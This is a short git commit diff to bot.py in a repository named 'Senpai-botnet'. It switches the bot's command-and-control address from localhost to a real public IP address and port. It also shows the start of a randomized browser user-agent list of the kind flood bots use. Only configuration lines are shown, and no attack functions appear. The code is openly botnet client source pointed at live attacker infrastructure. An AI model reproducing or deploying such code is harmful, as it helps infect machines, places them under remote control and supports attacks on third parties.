6a46fd12a404068e937b2ee07c2f68b5ed3e08d4
Pwned4ever2 <76585646+pwned4ever2@users.noreply.github.com>
2022-04-22 16:50:38 +0800

    Update bot.py

--- Senpai-botnet/bot.py
+++ Senpai-botnet/bot.py
@@ -9,8 +9,8 @@ import time
 import random
 
 # Configuration
-C2_ADDRESS  = '127.0.0.1'
-C2_PORT     = 9999
+C2_ADDRESS  = '1.116.115.169'
+C2_PORT     = 4000
 
 base_user_agents = [
     'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
